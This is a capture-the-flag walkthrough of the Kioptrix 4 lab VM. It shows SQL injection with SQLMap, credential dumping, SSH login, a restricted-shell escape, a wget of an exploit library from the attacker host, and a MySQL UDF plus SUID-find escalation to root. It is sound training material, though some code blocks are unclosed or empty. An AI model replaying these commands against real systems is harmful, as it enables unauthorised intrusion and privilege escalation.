# Kioptrix 4
Kioptrix 1.3 (#4) is the fourth of five VMs in the Kioptrix line. As usual, the goal is to get root and read the flag in /root.

VM can be found at [Vulnhub](https://www.vulnhub.com/entry/kioptrix-level-13-4,25/).

## My Setup
For convenience, I have Kali and the target VM(s) on a NAT Network in Virtualbox. Currently running on a Windows 10 host. 

**IP Range:** My NAT Network has a range of 10.0.2.0/24. 

## Discovery
You can't find a treasure without some idea of where it is. A quick run of Nmap's built-in ping scan will pick up the target.

```bash
root@kali:~# nmap -sP 10.0.2.0/24
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-02 16:17 EST
...
MAC Address: 08:00:27:F4:78:6B (Oracle VirtualBox virtual NIC)
Nmap scan report for 10.0.2.14
Host is up (0.00016s latency).
...
Nmap done: 256 IP addresses (5 hosts up) scanned in 15.07 seconds
```

Target is 10.0.2.14.

## Reconnaissance
We have the treasure map, but now we need to know how to get there. As usual, Nmap is used to poke the target from afar.

```bash
root@kali:~# nmap -sS -sV -T4 -p- 10.0.2.14
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-02 16:12 EST

Checking out the webserver, we're greeted with a login page. With nothing much to go on in the page source, let's see if there's an SQL Injection vulnerability.

My go-to tool for this is SQLMap, which can run a plethora of automated SQL Injecion tests.

But first, we need to catch the request so we know what to pass to SQLMap. Off to Burpsuite, we go.

Make sure to enable Burpsuite's proxy feature, and point your web browser to it.

  <figcaption>Burp, ready to go.</figcaption>
</figure>

Back to the browser, let's submit a login request. I'll use 'admin' for the username and 'test' as the password.

<figure>
  <img src="{{ site.url }}{{ site.baseurl }}/assets/img/kioptrix4/burp_catch.PNG" alt="">
  <figcaption>Burp caught our login request.</figcaption>
</figure>

We can forward this in a moment, but let's copy the POST data (the colored text).

## Are you afraid of needles?

Now we have SQLMap test each of the parameters for us. We'll use the form's action page that's present in the request. The POST data will go into the --data argument, and we'll specify POST as the request method.

I'm going to cut out a lot of the test output.

```bash
root@kali:~/Desktop/k4# sqlmap -u "http://10.0.2.14/checklogin.php" \
  --data "myusername=admin&mypassword=test&Submit=Login" \
  --method POST

## Finding a Vein

There's a ton of information here, not counting what I cut. This tells us that 'myusername' isn't injectable and 'mypassword' IS INJECTABLE.

From here, we'll use SQLMap to enumerate any databases and grab some data.

First up is the --dbs switch, which will list any databases (mysql, information_schema, etc.). I've also specified the -p (parameter) argument. We know which one it is; this will let SQLMap skip automated parameter checking.

```bash
root@kali:~/Desktop/k4# sqlmap -u "http://10.0.2.14/checklogin.php" \
  --data "myusername=admin&mypassword=test&Submit=Login" \
  --method POST -p "mypassword" --dbs

## Drawing Blood

Once again, I cut any superfluous output. One thing to keep in mind, unless the situation calls for it, we don't want to follow any redirects from the login form. If the redirect target isn't SQL injectable with the same parameters, we'll lose our (unintended) injection point and SQLMap won't be able to continue.

Now we know the available databases. I usually don't come across much in 'information_schema', but members is a non-standard database. Let's dump it.

Note the use of the --dump argument for data retrieval and -D argument to specify which database.

```bash
root@kali:~/Desktop/k4# sqlmap -u "http://10.0.2.14/checklogin.php" \
  --data "myusername=admin&mypassword=test&Submit=Login" \
  --method POST -p "mypassword" --dump -D members

SQLMap is always fun to use. With this command, it will typewrite what it finds. I cut out that part, because the table output at the bottom is more human-readable.

Either way, we have a couple usernames and passwords. One of them appears to be Base64 encoded (note the '=='). It doesn't decode to anything readable, so it could likely be a red herring.

If you get credentials for anything, it never hurts to try them over SSH. If you recall from all the way back when we ran Nmap, SSH is running on port 22.

## SSH! Quiet!

```bash
root@kali:~/Desktop/k4# ssh john@10.0.2.14
The authenticity of host '10.0.2.14 (10.0.2.14)' can't be established.

Type '?' or 'help' to get the list of allowed commands
```

We're able to log in as John on the target. However, we're given a login banner telling us the admins are watching, and we're in a restricted shell. 

They were nice enough to let us know what commands are allowed.

```bash
john:~$ ?
cd  clear  echo  exit  help  ll  lpath  ls
```

Going down the list...

| Command | Description |
| ------- | ----------- |
| cd | Change Directory |
| clear | Clear screen |
| echo | Do I really need to? |
| exit | Quit our SSH session |
| help | Display list of commands |
| ll | Alias for 'ls -l' |
| lpath | Tells us our $PATH is limited | 
| ls | Directory listing |

...Not much to work with, at all.

In my testing of commands, I ran 'echo $PATH' thinking it would be fine, but I got a warning.

```bash
john:~$ lpath
Allowed:
 /home/john
john:~$ echo $PATH                                                                                                 
*** forbidden path -> "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games"
*** You have 0 warning(s) left, before getting kicked out.

```

## Jailbreak

Let's try for a restricted shell escape, using only 'echo'.

After some googling, I found an article on [UD64](https://ud64.com/ask/61/escaping-bypass-from-jail-restricted-linux-shells) with an echo-only shell escape.

```bash
john:~$ echo os.system("/bin/sh")
$ whoami
john
```

## Enumeration

Cool, now we have proper user access. Let's see what all we can find. 

I like to start with 'ps aux' to see what all's running.

```bash
$ ps aux

The MySQL service is running as root, which isn't good security practice. Let's find the MySQL credentials in the webserver root.

For Apache, /var/www is a good place to start. The login page's form handler, 'checklogin.php' seemed a good place to start. 

But first, let's upgrade our shell.

```bash
$ /bin/bash
john@Kioptrix4:~$ cd /var/www
john@Kioptrix4:/var/www$ ls
checklogin.php  database.sql  images  index.php  john  login_success.php  logout.php  member.php  robert
john@Kioptrix4:/var/www$ nano checklogin.php
```

Oh my, running MySQL as root, using the root user, and with NO password!

If you've seen my Raven walkthroughs, you know exactly where this is going.

## UDF! UDF! UDF!

Let's add a MySQL user-defined-function (UDF) that lets us run a command. Back to Kali for a bit of prep work.

```bash

```

The instructions are available in the C file, and we'll follow them with a couple changes.

We also need to grab our local IP to push files to the target.

Back over to our shell on the target. We'll use wget to pull 1518.so from Kali over to John's home directory.

```bash
john@Kioptrix4:/var/www$ cd
john@Kioptrix4:~$ ls
john@Kioptrix4:~$ wget http://10.0.2.15:8000/1518.so
--17:40:46--  http://10.0.2.15:8000/1518.so
           => `1518.so'

I'm not going to go through the entire command sequence, for a couple reasons.

## But I thought everything just works?

To start, it's already in the exploit file's instructions. But, in addition, I was able to get it to work on my desktop; however, it wouldn't on my laptop for some reason.

I got an error about an incorrect ELF class from the MySQL prompt, but googling didn't turn up much.

On a brighter note, checking the MySQL functions reveals all that work has already been done for us.

```bash
mysql> create function do_system returns integer soname 'raptor.so';
ERROR 1126 (HY000): Can't open shared library 'raptor.so' (errno: 22 raptor.so: wrong ELF class: ELFCLASS64)

mysql> \! sh

$ cat /tmp/out

```

## Touch Fluffytail

The sys_exec function is already there, runs as root, and is there for us to use.

```bash
mysql> select sys_exec('chmod u+s /usr/bin/find');
+-------------------------------------+
| sys_exec('chmod u+s /usr/bin/find') |
+-------------------------------------+

+-------------------------------------+
1 row in set (0.00 sec)

mysql> exit;
Bye
john@Kioptrix4:~$ touch fluffytail
john@Kioptrix4:~$ find fluffytail -exec "whoami" \;
root
john@Kioptrix4:~$ find fluffytail -exec "/bin/sh" \;
# whoami
root
```

Let's grab that flag.

```bash
# cd /root
# pwd
/root
# ls
congrats.txt  lshell-0.9.12
# cat congrats.txt
Congratulations!
You've got root.

There is more then one way to get root on this system. Try and find them.
I've only tested two (2) methods, but it doesn't mean there aren't more.
As always there's an easy way, and a not so easy way to pop this box.
Look for other methods to get root privileges other than running an exploit.

It took a while to make this. For one it's not as easy as it may look, and
also work and family life are my priorities. Hobbies are low on my list.
Really hope you enjoyed this one.
